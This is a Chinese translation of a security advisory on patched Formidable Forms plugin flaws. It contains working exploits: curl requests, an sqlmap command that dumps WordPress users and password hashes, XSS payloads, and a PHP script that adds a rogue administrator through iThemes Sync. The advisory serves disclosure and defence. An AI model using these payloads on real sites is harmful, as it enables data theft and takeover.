> 原文链接: https://www.anquanke.com//post/id/87269 


# 【技术分享】对WordPress插件Formidable Forms多个漏洞的分析


                                阅读量   
                                **93150**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：klikki.fi
                                <br>原文地址：[https://klikki.fi/adv/formidable.html](https://klikki.fi/adv/formidable.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t016de869fe2e1b703f.png)](https://p0.ssl.qhimg.com/t016de869fe2e1b703f.png)

译者：[eridanus96](http://bobao.360.cn/member/contribute?uid=2857535356)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**概述**

****

**Formidable Forms**是一个流行的WordPress插件，目前已拥有超过20万次安装数量。这一插件可以用来创建通讯录、调查问卷和多种其他类型的窗体。该插件的基本版（Basic）是免费的，升级为专业版（Pro）则须另外付费。

我们本次发现了这一插件中的多个漏洞，这些漏洞已经在2.05.02和2.05.03版本中被修复。

<br>

**预览功能未经认证允许使用短代码漏洞**

****

该插件包含一个表单预览的**AJAX**函数，并且在未经认证的情况下，允许任何人使用此函数。该函数对于一些能够影响其表单预览HTML显示效果的参数没有加以限制。因此，参数after_html和before_html可以被用来在表单的前后加入自定义的HTML。我们本次所发现的大多数漏洞都是因这一问题而产生的。

短代码（Shortcode）是WordPress中的一项重要特性，借助短代码，用户可以发轻松地发布动态内容。通常情况下，这些参数中的短代码会首先被系统判断。考虑到短代码中的内容可能较为敏感，在未验证用户身份的前提下，短代码一般不会被加载。WordPress的内核支持短代码，插件也可以实现它们自身的短代码。然而，某些插件中的短代码，会直接允许服务器端执行代码（例如Shortcodes Ultimate终极简码插件）。在Formidable Forms中，一些短代码就可以被进行漏洞利用。

例如：



```
url -s -i 'https://target.site/wp-admin/admin-ajax.php' 
      --data 'action=frm_forms_preview&amp;after_html=any html here and [any_shortcode]...'
```



**SQL****注入漏洞**

****

Formidable专业版所支持的[display-frm-data]短代码包含一个SQL注入漏洞。其中的“order”短代码属性，在不进行任何检查和转义的情况下，就可以直接在ORDER BY子句中使用。例如，以下请求将会在服务器日志中产生一条SQL错误消息：



```
curl -s -i 'https://target.site/wp-admin/admin-ajax.php' 
      --data 'action=frm_forms_preview&amp;after_html=[display-frm-data id=123 order_by=id limit=1 order=zzz]'
```

利用这一漏洞有几个难点，但它们是可以解决的。**首先，我们需要进行的是一个盲SQL注入，攻击者并不能直接看到SQL查询的结果。并且，它只会影响响应中所显示项目的顺序。**尽管如此，通过借助SQLMap等工具，这一漏洞还是足以让我们检索到全部数据库内容。

其次，当Formidable进行SQL查询时，会使用多种方式来处理其中的“order”属性。如果参数中有逗号，那么插件会在结果中的每一个逗号后面加上字符串“it.id”。然而，如下面的例子所示，**SQLMap中的-eval参数可以在这里使用，我们可以通过在每个逗号后面添加“-it.id+”来解决这一问题。**

举例来说，根据这一规则，一个注入的“SELECT a, b”查询，将被转换为“SELECT a,it.id b”。我们所使用的-eval参数就可以将上述语句“修复”成“SELECT a, it.id-it.id+b”，实际上也就是原本我们想注入的查询语句。

此外，SQLMap中的Commalesslimit这一Tamper是用于避免LIMIT clauses所导致的问题。

SQLMap命令行样例：



```
./sqlmap.py -u 'https://target.site/wp-admin/admin-ajax.php' 
      --data 'action=frm_forms_preview&amp;before_html=[display-frm-data id=123 order_by=id limit=1 order="%2a( true=true )"]' 
      --param-del ' ' -p true --dbms mysql --technique B --string test_string 
      --eval 'true=true.replace(",",",-it.id%2b");order_by="id,"*true.count(",")+"id"'  
      --test-filter DUAL --tamper commalesslimit -D database_name 
      --sql-query "SELECT user_name FROM wp_users WHERE id=1"
```



这样一来，该漏洞就可以用于遍历系统上的数据库和表，并可以检索数据库中指定内容。**其中包括：WordPress用户的详细信息、密码哈希值、全部Formidable数据以及其他数据库中用户可以访问的内容。**如果使用上述命令行，必须要将database_name更改为现有的数据库名称，将123修改为有效的表单ID，并且test_string需要与该表单中的数据匹配，这样SQLMap才能够给出正确的响应。



**未授权的表单条目检索漏洞**

Formidable中的[formresults]短代码可用于**查看在该网站上提交任何表单之后所得到的响应。**在表单响应中，往往会包含联系人信息或者其他敏感内容。

以下是使用cURL命令行工具的检索示例：



```
curl 'https://target.site/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&amp;after_html=[formresults id=123]'
```

其获得的响应，会包含在ID为123的表单中提交的所有条目。

<br>

**表单预览中的反射型XSS漏洞**

****

如前文所述，由于可以**在after_html和before_html参数中注入自定义的HTML**，我们就可以通过注入一些危险的HTML代码，以此来实现基于POST的XSS攻击。例如下面的表单：

```
&lt;form method="POST" action=" 
&lt;input name="before_html" value="&lt;svg on[entry_key]load=alert(/xss/) /&gt;"&gt; 
&lt;/form&gt;
```



在渲染之前，Formidable会将[entry_key]这一部分删去，这就导致该代码可以绕过浏览器内置的XSS防范机制。



**表单条目存储型XSS漏洞**

****

在WordPress仪表盘中，管理员可以在Formidable表单中查看到用户输入的数据。**尽管wp_kses()函数会对表单中输入的HTML加以筛选，但由于它允许了“id”和“class”HTML属性，因此并不能防范一些具有攻击性的HTML代码，例如&lt;form&gt; HTML标签。**我们可以编写特定的HTML代码，从而让攻击者指定的JavaScript在管理员查看表单条目时执行。

例如：



```
&lt;form id=tinymce&gt;&lt;textarea name=DOM&gt;&lt;/textarea&gt;&lt;/form&gt;
&lt;a&gt;panelInit&lt;/a&gt;
&lt;a id="frm_dyncontent"&gt;&lt;b id="xxxdyn_default_valuexxxxx" class="ui-find-overlay wp-editor-wrap"&gt;overlay&lt;/b&gt;&lt;/a&gt;
&lt;a id=post-visibility-display&gt;vis1&lt;/a&gt;&lt;a id=hidden-post-visibility&gt;vis2&lt;/a&gt;&lt;a id=visibility-radio-private&gt;vis3&lt;/a&gt;
&lt;div id=frm-fid-search-menu&gt;&lt;a id=frm_dynamic_values_tab&gt;zzz&lt;/a&gt;&lt;/div&gt;
&lt;form id=posts-filter method=post action=admin-ajax.php?action=frm_forms_preview&gt;&lt;textarea name=before_html&gt;&amp;lt;svg on[entry_key]load=alert(/xss/) /&amp;gt;&lt;/textarea&gt;&lt;/form&gt;
```



上述代码中的“id”和“class”属性会由Formidable的初始化JavaScript（formidable_admin.js）来专门处理。如果存在包含“frm_field_list”类的元素，则会执行frmAdminBuild.panelInit()函数。

而在该函数的末尾，如果发现存在“tinymce”对象，就会添加某些事件处理程序（Event Handlers）：

```
if(typeof(tinymce)=='object')`{` 
    // ... 
    jQuery('#frm_dyncontent').on('mouseover mouseout', '.wp-editor-wrap', function(e)`{` 
        // ... 
        toggleAllowedShortcodes(this.id.slice(3,-5),'focusin'); 
    `}` 
        
`}`
```



这一检查的结果，会通过在表单中添加&lt;form id=tinymce&gt;元素来实现传递。事件处理程序mouseover和mouseout则会被添加到攻击者定义的“frm_dyncontent”元素之中。它包含一个具有类属性的&lt;b&gt;元素，因此它将会填充整个浏览器窗口，从而自动触发处理程序，并最终导致执行toggleAllowedShortcodes ()函数。

由于slice()调用是在X之前被移除，函数在被调用时带有“Dyn_default_value”参数。该函数如下：



```
//Automatically select a tab
if(id=='dyn_default_value')`{`
    jQuery(document.getElementById('frm_dynamic_values_tab')).click();
```

除此之外，攻击者定义的条目中还包含一个“frm_dynamic_values_tab”条目。该元素上的任何一个Click处理程序现在都会被自动执行。因为它位于一个“frm-fid-search-menu”标签之中，所以会有一个Click事件处理事件。这一Click处理事件是由下面这段代码进行安装的：



```
// submit the search for with dropdown 
jQuery('#frm-fid-search-menu a').click(function()`{` 
    var val = this.id.replace('fid-', ''); 
    jQuery('select[name="fid"]').val(val); 
        jQuery(document.getElementById('posts-filter')).submit(); 
            return false; 
`}`);
```



这也就意味着，**当查看表单条目时，将会自动提交ID为“posts-filter”的表单。**这一表单也可以在攻击者的表单响应中被注入，正如上面的例子所示。该漏洞利用基于POST的反射型XSS，采用有效的方式将其转变为存储型XSS。

在安装并触发处理事件前，vis1、vis2和vis3元素将会包含在其中，以防止出现JavaScript错误。

通过这种方式，未经身份验证的攻击者可以在Formidable表单条目中插入任意的JavaScript，一旦管理员在WordPress仪表盘中查看该表单，就能够自动执行。服务器端代码可以在默认配置下实现，例如通过插件，或是借助主题编辑器的AJAX功能。



**通过iThemes Sync实现的服务器端代码执行漏洞**

****

该漏洞并不属于Formidable，而是我们在研究过程中从另一个插件发现了相似原理的漏洞。**如果开启了iThemes Sync插件，我们可以借助SQL注入，查询到数据库中的身份验证秘钥****：**



```
SELECT option_value FROM wp_options WHERE option_name='ithemes-sync-cache'
```

返回的响应包含PHP序列化后的用户ID及身份验证密钥，例如：



```
... s:15:"authentications";a:1:`{`i:123;a:4:`{`s:3:"key";s:10:"(KEY HERE)";s:9:"timestamp"; ...
```

 在这里，用户ID为123，密钥为“(KEY HERE)”。当我们拥有了这个信息之后，就可以通过iThemes Sync的功能来控制WordPress系统。具体功能包括：添加新的管理员账户、安装指定WordPress插件并启用。

示例脚本如下：





```
&lt;?php 
// fill in these two 
$user_id='123'; 
$key='(KEY HERE)'; 
 
$action='manage-users'; 
 
$newuser=array(); 
$newuser[0]=array(); 
$newuser[0][0]=array(); 
$newuser[0][0]['user_login']='newuser'; 
$newuser[0][0]['user_pass']='newpass'; 
$newuser[0][0]['user_email']='test@klikki.fi'; 
$newuser[0][0]['role']='administrator'; 
 
$args=array(); 
$args['add']=$newuser; 
 
$salt='A'; 
 
$hash=hash('sha256',$user_id.$action.json_encode($args).$key.$salt); 
 
$req=array(); 
$req['action']=$action; 
$req['arguments']=$args; 
$req['user_id']=$user_id; 
$req['salt']=$salt; 
$req['hash']=$hash; 
 
$data='request='.json_encode($req); 
echo("sending: $datan"); 
 
$c=curl_init(); 
curl_setopt($c, CURLOPT_URL,'https://target.site/?ithemes-sync-reques%74=1'); 
curl_setopt($c, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla','X-Forwarded-For: 123.1.2.3')); 
curl_setopt($c, CURLOPT_POSTFIELDS, $data); 
$res=curl_exec($c); 
 
echo("response: ".json_encode($res)."n"); 
?&gt;
```

通过上述示例，我们在目标系统上添加了一个新的WordPress管理员“newuser”，密码设置为“newpass”。为绕过系统加固，我们对查询字符串参数进行了冗余编码。同理，我们还设置了X-Forwarded-For header。



**厂商回应**

****

Strategy11在2017年10月得知漏洞详情，随后确认漏洞存在，并在2.05.02和2.05.03版本完成了修复。如果没有启用自动更新，用户可以通过点击WordPress插件界面上的“Update”来更新插件，基础版和专业版均对上述漏洞进行了修复。



**贡献者**

****

上述漏洞均由芬兰安全研究团队Klikki Oy的Jouko Pynnön发现。
